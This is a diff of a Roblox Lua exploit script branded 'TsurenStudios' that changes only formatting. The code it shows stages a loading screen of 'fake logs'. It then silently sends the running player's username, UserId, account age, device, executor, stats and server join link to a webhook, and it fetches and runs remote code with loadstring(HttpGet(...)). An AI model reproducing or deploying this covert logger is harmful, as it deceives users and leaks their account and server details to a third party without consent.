@@ -69,16 +69,16 @@ local function StartLoadingScreen()
     gui.Parent = PlayerGui
 
     local bg = Instance.new("Frame")
-    bg.Size = UDim2.fromScale(1,1)
-    bg.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    bg.Size = UDim2.fromScale(1, 1)
+    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     bg.Parent = gui
 
     local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1,0,0,80)
-    title.Position = UDim2.new(0,0,0.05,0)
+    title.Size = UDim2.new(1, 0, 0, 80)
+    title.Position = UDim2.new(0, 0, 0.05, 0)
     title.BackgroundTransparency = 1
     title.Text = "TsurenStudios"
-    title.TextColor3 = Color3.fromRGB(0,170,255)
+    title.TextColor3 = Color3.fromRGB(0, 170, 255)
     title.TextScaled = true
     title.Font = Enum.Font.GothamBold
     title.Parent = bg
@@ -93,20 +93,20 @@ local function StartLoadingScreen()
     end)
 
     local consoleFrame = Instance.new("Frame")
-    consoleFrame.Size = UDim2.fromScale(0.6,0.45)
-    consoleFrame.Position = UDim2.fromScale(0.2,0.3)
-    consoleFrame.BackgroundColor3 = Color3.fromRGB(10,10,10)
-    consoleFrame.BorderColor3 = Color3.fromRGB(0,255,0)
+    consoleFrame.Size = UDim2.fromScale(0.6, 0.45)
+    consoleFrame.Position = UDim2.fromScale(0.2, 0.3)
+    consoleFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    consoleFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
     consoleFrame.BorderSizePixel = 2
     consoleFrame.Parent = bg
 
     local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0,8)
+    corner.CornerRadius = UDim.new(0, 8)
     corner.Parent = consoleFrame
 
     local consoleText = Instance.new("TextLabel")
-    consoleText.Size = UDim2.new(1,-10,1,-10)
-    consoleText.Position = UDim2.new(0,5,0,5)
+    consoleText.Size = UDim2.new(1, -10, 1, -10)
+    consoleText.Position = UDim2.new(0, 5, 0, 5)
     consoleText.BackgroundTransparency = 1
     consoleText.TextXAlignment = Enum.TextXAlignment.Left
     consoleText.TextYAlignment = Enum.TextYAlignment.Top
@@ -115,13 +115,13 @@ local function StartLoadingScreen()
     consoleText.Text = ""
     consoleText.Font = Enum.Font.Code
     consoleText.TextSize = 18
-    consoleText.TextColor3 = Color3.fromRGB(0,255,0)
+    consoleText.TextColor3 = Color3.fromRGB(0, 255, 0)
     consoleText.Parent = consoleFrame
 
     local logs = {}
     local function addLog(msg)
         table.insert(logs, msg)
-        if #logs > 18 then table.remove(logs,1) end
+        if #logs > 18 then table.remove(logs, 1) end
         consoleText.Text = table.concat(logs, "\n")
     end
 
@@ -138,14 +138,14 @@ local function StartLoadingScreen()
 
     task.spawn(function()
         local fakeLogs = {
-            "Initializing TsurenStudios Client...",
-            "Loading assets...",
-            "Checking environment...",
-            "Mounting services...",
-            "Preparing client...",
+            "Initializing TsurenStudios Client...", 
+            "Loading assets...", 
+            "Checking environment...", 
+            "Mounting services...", 
+            "Preparing client...", 
             "Finalizing..."
         }
-        for _,v in ipairs(fakeLogs) do
+        for _, v in ipairs(fakeLogs) do
             print(v)
             task.wait(1.2)
         end
@@ -157,10 +157,10 @@ local function StartLoadingScreen()
         consoleFrame.BorderSizePixel = 0
         consoleFrame.BackgroundTransparency = 1
         local heart = Instance.new("TextLabel")
-        heart.Size = UDim2.fromScale(1,1)
-        heart.Position = UDim2.new(0,0,0,0)
+        heart.Size = UDim2.fromScale(1, 1)
+        heart.Position = UDim2.new(0, 0, 0, 0)
         heart.BackgroundTransparency = 1
-        heart.TextColor3 = Color3.fromRGB(255,0,0)
+        heart.TextColor3 = Color3.fromRGB(255, 0, 0)
         heart.TextScaled = true
         heart.Font = Enum.Font.Code
         heart.RichText = true
@@ -168,22 +168,22 @@ local function StartLoadingScreen()
         heart.TextYAlignment = Enum.TextYAlignment.Center
 
         local heartPattern = {
-            "0000110000110000",
-            "0011111001111100",
-            "0111111111111110",
-            "1111111111111111",
-            "1111111111111111",
-            "0111111111111110",
-            "0011111111111100",
-            "0001111111111000",
-            "0000111111110000",
-            "0000011111100000",
-            "0000001111000000",
-            "0000000110000000",
+            "0000110000110000", 
+            "0011111001111100", 
+            "0111111111111110", 
+            "1111111111111111", 
+            "1111111111111111", 
+            "0111111111111110", 
+            "0011111111111100", 
+            "0001111111111000", 
+            "0000111111110000", 
+            "0000011111100000", 
+            "0000001111000000", 
+            "0000000110000000", 
         }
 
         local heartText = ""
-        for _,line in ipairs(heartPattern) do
+        for _, line in ipairs(heartPattern) do
             for c in line:gmatch(".") do
                 heartText = heartText .. (c=="1" and "1" or " ") 
             end
@@ -193,7 +193,7 @@ local function StartLoadingScreen()
         heart.Parent = consoleFrame
 
         task.delay(2.5, function()
-            local goal = {Position = UDim2.new(0,0,2,0)}
+            local goal = {Position = UDim2.new(0, 0, 2, 0)}
             local tween = TweenService:Create(bg, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), goal)
             tween:Play()
             tween.Completed:Connect(function()
@@ -212,9 +212,9 @@ repeat task.wait() until not LoadingActive
 
 -- ========== SAFE STATS ==========
 local function GetSafeStats()
-    local coins, level, xp, points = "N/A","N/A","N/A","N/A"
+    local coins, level, xp, points = "N/A", "N/A", "N/A", "N/A"
     local success, gui = pcall(function()
-        return PlayerGui:WaitForChild("GameGui",15):WaitForChild("LobbyHUD",15):WaitForChild("Topbar",15):WaitForChild("Leaderstats",15)
+        return PlayerGui:WaitForChild("GameGui", 15):WaitForChild("LobbyHUD", 15):WaitForChild("Topbar", 15):WaitForChild("Leaderstats", 15)
     end)
     if success and gui then
         pcall(function() coins = gui.Coins.Container.Amount.Text end)
@@ -241,37 +241,37 @@ local function SendWebhook()
     pcall(function() gameName = MarketplaceService:GetProductInfo(placeId).Name end)
 
     local payload = {
-        username = "TsurenStudios Logger",
-        content = "✅ Rayfield Loaded",
+        username = "TsurenStudios Logger", 
+        content = "✅ Rayfield Loaded", 
         embeds = {{
-            title = "🎮 Player Logged",
-            color = 5793266,
+            title = "🎮 Player Logged", 
+            color = 5793266, 
             fields = {
-                {name="👤 Username", value=username, inline=true},
-                {name="✨ Display Name", value=displayName, inline=true},
-                {name="🆔 UserId", value=tostring(userId), inline=true},
-                {name="📅 Account Age", value=accountAge, inline=true},
-                {name="💻 Device", value=GetDevice(), inline=true},
-                {name="⚙ Executor", value=GetExecutor(), inline=true},
-                {name="📡 Ping", value=GetPing(), inline=true},
-                {name="💰 Coins", value=coins, inline=true},
-                {name="⭐ Level", value=level, inline=true},
-                {name="⚡ XP", value=xp, inline=true},
-                {name="🎯 SkillPoints", value=points, inline=true},
-                {name="🎮 Game", value=gameName, inline=false},
-                {name="🧩 JobId", value="```"..jobId.."```", inline=false},
-                {name="🔗 Join Server", value=joinLink, inline=false},
-            },
-            footer = {text="TsurenStudios | FINAL FIX"},
+                {name="👤 Username", value=username, inline=true}, 
+                {name="✨ Display Name", value=displayName, inline=true}, 
+                {name="🆔 UserId", value=tostring(userId), inline=true}, 
+                {name="📅 Account Age", value=accountAge, inline=true}, 
+                {name="💻 Device", value=GetDevice(), inline=true}, 
+                {name="⚙ Executor", value=GetExecutor(), inline=true}, 
+                {name="📡 Ping", value=GetPing(), inline=true}, 
+                {name="💰 Coins", value=coins, inline=true}, 
+                {name="⭐ Level", value=level, inline=true}, 
+                {name="⚡ XP", value=xp, inline=true}, 
+                {name="🎯 SkillPoints", value=points, inline=true}, 
+                {name="🎮 Game", value=gameName, inline=false}, 
+                {name="🧩 JobId", value="```"..jobId.."```", inline=false}, 
+                {name="🔗 Join Server", value=joinLink, inline=false}, 
+            }, 
+            footer = {text="TsurenStudios | FINAL FIX"}, 
             timestamp = DateTime.now():ToIsoDate()
         }}
     }
 
     pcall(function()
         req({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"]="application/json"},
+            Url = WEBHOOK_URL, 
+            Method = "POST", 
+            Headers = {["Content-Type"]="application/json"}, 
             Body = HttpService:JSONEncode(payload)
         })
     end)
@@ -283,9 +283,9 @@ task.delay(1, SendWebhook)
 -- ========== LOAD RAYFIELD ==========
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 local Window = Rayfield:CreateWindow({
-    Name = "TsurenStudios | SLS 🌸",
-    LoadingTitle = "TsurenStudios",
-    LoadingSubtitle = "Made by Tsubasa ♥️",
+    Name = "TsurenStudios | SLS 🌸", 
+    LoadingTitle = "TsurenStudios", 
+    LoadingSubtitle = "Made by Tsubasa ♥️", 
     Theme = "Bloom"
 })
 
